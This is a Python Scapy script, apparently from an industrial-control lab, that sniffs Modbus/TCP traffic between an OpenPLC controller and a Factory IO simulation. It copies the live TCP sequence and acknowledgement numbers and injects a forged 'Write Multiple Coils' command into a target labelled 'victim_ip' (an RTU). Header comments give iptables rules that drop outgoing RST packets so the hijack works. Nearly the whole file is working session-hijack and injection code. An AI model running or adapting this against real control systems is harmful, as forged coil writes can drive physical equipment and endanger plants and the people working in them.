######################################################################
#
#BASED ON:
#https://gist.github.com/spinpx/263a2ed86f974a55d35cf6c3a2541dc2
#
#Very good for understanding ACK and sequence numbers
#https://packetlife.net/blog/2010/jun/7/understanding-tcp-sequence-acknowledgment-numbers/
#https://www.packetlevel.ch/html/scapy/scapy3way.html
#
#In order for the script to work, supress the RST in the OS may be required:
#Create: sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 192.168.30.20 -j DROP
#Remove: sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -s 192.168.30.20 -j DROP
#View: sudo iptables -L
#
######################################################################

from time import sleep 
from scapy.all import *

#Modbus Layer Definition
Transaction_ID=1337 #Whatever, not relevant

class ModbusTCP(Packet):
    name = "mbtcp"
    fields_desc = [ ShortField("Transaction Identifier", Transaction_ID), 
                    ShortField("Protocol Identifier", 0),
                    ShortField("Length", 8),
                    ByteField("Unit Identifier",1) #Same number as the target unit in the wireshark capture
                    ]
                    
#Modbus Write Multiple Coils                    
class Modbus(Packet):
    name = "modbus"
    fields_desc = [ XByteField("Function Code", 15),   
                    ShortField("Reference Number", 0),
                    ShortField("Bit Count", 5), #Same number as the capture in wireshark
                    ByteField("Byte Count", 1),
                    ByteField("Data", 9)
                    ]

win= 502
victim_ip = "192.168.88.100"  #RTU
your_iface = "eth0"


flag=1
print("---------------------------- SNIFFING")
while flag:
	OPENPLC_FRAMES = sniff(iface=your_iface, count=4,  #Sniffs  2 packets comming from OpenPLC to Factory IO until it detects the end of the cycle (ACK from OpelPlC to FactoryIO for the write coils response)
			lfilter=lambda x: x.haslayer(TCP)
			and x[IP].dst == victim_ip)
	OPENPLC_WRITE_COILS_QUERY= OPENPLC_FRAMES[2] #Takes the last modbus query of the cycle
	OPENPLC_WRITE_COILS_ACK= OPENPLC_FRAMES[3] #Takes the last ack of the cycle (vector is size 4 but ends in 3 because starts at 0)
	
	try: #If there is no raw layer (in the case of ACK messages it will fail, so we need to catch the exception)
		if "x0f\\x00\\x00\\x00\\x05\\x01" in str(OPENPLC_WRITE_COILS_QUERY[Raw].load):  #Tests if the string that identifies the write coils function is present in the capture
			print("---------------------------- END OF COMMUNICATION LOOP (WRITE MULTIPLE COILS) DETECTED")
			flag=0	
	except:
		flag=1

print("---------------------------- CRAFTING PACKET")
tcpdata = {#Vector to store the sniffed values from the last ACK
	'src': OPENPLC_WRITE_COILS_ACK[IP].src,
	'dst': OPENPLC_WRITE_COILS_ACK[IP].dst,
	'sport': OPENPLC_WRITE_COILS_ACK[TCP].sport,
	'dport': OPENPLC_WRITE_COILS_ACK[TCP].dport,
	'seq': OPENPLC_WRITE_COILS_ACK[TCP].seq,
	'ack': OPENPLC_WRITE_COILS_ACK[TCP].ack
	}	

PAYLOAD = IP(src=tcpdata['src'], dst=tcpdata['dst']) / \
			TCP(sport=tcpdata['sport'], dport=tcpdata['dport'],
			flags="PA", window=win, seq=tcpdata['seq'], ack=tcpdata['ack'])/ \
			ModbusTCP()/Modbus()

print("---------------------------- INJECTING PACKET")
send(PAYLOAD, verbose=0, iface=your_iface)

print("---------------------------- PACKET INJECTED")
PAYLOAD.display()













